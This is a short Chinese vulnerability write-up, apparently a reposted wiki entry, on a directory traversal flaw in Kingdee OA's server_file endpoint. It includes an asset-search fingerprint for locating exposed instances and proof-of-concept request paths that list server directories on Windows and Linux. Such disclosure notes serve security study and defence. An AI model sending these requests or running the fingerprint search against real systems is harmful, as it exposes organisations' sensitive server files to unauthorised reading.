---
title: "金蝶OA server_file 目录遍历漏洞"
date: 2026-10-17 09:13:53
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "金蝶OA"
tags:
  - "金蝶OA"
  - "目录遍历"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

金蝶OA server_file 存在目录遍历漏洞，攻击者通过目录遍历可以获取服务器敏感信息

## 漏洞影响

```
金蝶OA
```

## 网络测绘

```
app="Kingdee-EAS"
```

## 漏洞复现

登录界面为



![1](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202090144781.png)

漏洞POC

```plain
/appmonitor/protected/selector/server_file/files?folder=/&suffix=

# Windows服务器
appmonitor/protected/selector/server_file/files?folder=C://&suffix=

# Linux服务器
appmonitor/protected/selector/server_file/files?folder=/&suffix=
```

![2](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202090144057.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E9%87%91%E8%9D%B6OA-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md)
